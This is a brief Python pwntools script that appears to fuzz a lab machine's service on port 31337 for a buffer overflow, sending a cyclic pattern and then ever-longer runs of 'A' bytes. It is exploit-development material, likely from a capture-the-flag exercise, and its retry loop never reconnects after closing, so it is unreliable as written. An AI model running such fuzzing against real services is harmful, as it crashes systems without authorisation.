#!/usr/bin/env python3
from pwn import *
import socket, time, sys
from colorama import init as colorama_init
from colorama import Fore
colorama_init()

ip = "10.10.141.86" # CHANGE THIS TO MACHINE IP
port = 31337
timeout = 5

prefix = b"" # CHANGE THIS TO TASK 
garbage = cyclic_metasploit(250)
r = remote(ip,port)
while True:
    try:
        r.sendline(garbage)
        print(r.recvuntil(b'!!!'))
    except:
        print(f"[+] Sending {len(garbage)}")
        r.close()
    
    garbage += 100 * b"A"
    time.sleep(1)
    